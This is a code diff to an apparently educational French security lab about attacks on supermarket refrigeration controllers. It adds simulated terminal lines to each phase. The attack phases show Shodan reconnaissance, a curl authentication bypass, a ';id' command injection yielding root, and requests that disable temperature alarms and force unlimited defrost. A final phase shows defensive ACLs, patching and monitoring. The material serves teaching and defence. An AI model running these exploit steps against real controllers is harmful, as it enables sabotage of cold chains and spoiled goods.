@@ -14,6 +14,12 @@ const OBJECTIVES = [
 const PHASES: LabPhase[] = [
   {
     title: 'Repérage — la surface d’attaque',
+    commandLines: [
+      '> shodan search "StoreView" --fields ip_str,port',
+      '[+] ~2 600 interfaces d’admin publiquement accessibles (majorité en France)',
+      '> curl -s -m 10 http://203.0.113.7/admin/login.html',
+      '[+] Page de connexion StoreView lisible depuis Internet',
+    ],
     brief:
       'Vous cherchez à cibler des chaînes du froid. Notez bien : l’incident réel d’octobre 2026 en France (≈700 magasins Intermarché/Netto, Super U, Carrefour, Monoprix, Leclerc) est parti d’ici.',
     choices: [
@@ -39,6 +45,10 @@ const PHASES: LabPhase[] = [
   },
   {
     title: 'Accès initial — le contournement',
+    commandLines: [
+      '> curl -s -X POST http://203.0.113.7/admin/api/auth -d "user=admin&code=12/10/2026"',
+      '[+] 200 OK — contournement « code du jour » (CVE-2025-41450)',
+    ],
     brief:
       'Les failles des AK-SM 800A ont été publiées par Claroty (Team82) courant 2025, un correctif (R4.3.1) est sorti en août 2025 — mais des milliers d’appareils n’ont jamais été mis à jour.',
     choices: [
@@ -58,6 +68,10 @@ const PHASES: LabPhase[] = [
   },
   {
     title: 'Prise de contrôle',
+    commandLines: [
+      '> curl -s -X POST http://203.0.113.7/admin/api/exec -d "cmd=;id"',
+      '[+] uid=0(root) — exécution de commandes confirmée (CVE-2025-41451)',
+    ],
     brief: 'Authentifié, vous disposez du panneau d’administration des unités frigorifiques.',
     choices: [
       {
@@ -76,6 +90,12 @@ const PHASES: LabPhase[] = [
   },
   {
     title: 'Le sabotage (nuit du 11 au 12 octobre 2026)',
+    commandLines: [
+      '> curl -s -X POST http://203.0.113.7/admin/api/defrost -d "mode=manual&timeLimit=off"',
+      '> curl -s -X POST http://203.0.113.7/admin/api/alarms -d "tempProbe=disabled"',
+      '[+] Dégivrage illimité armé, alertes des sondes neutralisées',
+      '[!] Nuit du 11 au 12 : jusqu’à 50 °C pendant plus de 6 heures',
+    ],
     brief:
       'Vous voulez causer des dégâts visibles en une nuit, sans coupure électrique ni alarme. Qu’ont fait les attaquants réels ?',
     choices: [
@@ -95,6 +115,21 @@ const PHASES: LabPhase[] = [
   },
   {
     title: 'Changement de casquette : défense',
+    commandLines: [
+      '> conf t',
+      '  ip access-list extended FROID-WEB',
+      '   deny   tcp any any range 80 443',
+      '   permit tcp host 10.10.0.9 host 10.20.70.21 eq 443',
+      '  interface Vlan70',
+      '   description FROID-OT (aucune route Internet)',
+      '   ip access-group FROID-WEB in',
+      '[+] Interfaces admin retirées d’Internet (nft/ACL périmétrique + VLAN sans route sortante)',
+      '> firmware ak-sm800a --upgrade 4.3.1   / plan de remplacement AK-SC355 (EOL)',
+      '> config set --security-level strict --passwords unique',
+      '[+] Patché et durci : comptes dédiés, mots de passe changés, niveau Strict',
+      '> monitoring add alarm --trigger "dégivrage > 30 min" --probe externe',
+      '[+] Sonde de température indépendante du contrôleur + alerte sur cycle anormal',
+    ],
     brief:
       'Vous êtes responsable sécurité d’un groupe de grande distribution. Deuxième vague en approche : que faites-vous d’abord ?',
     choices: [
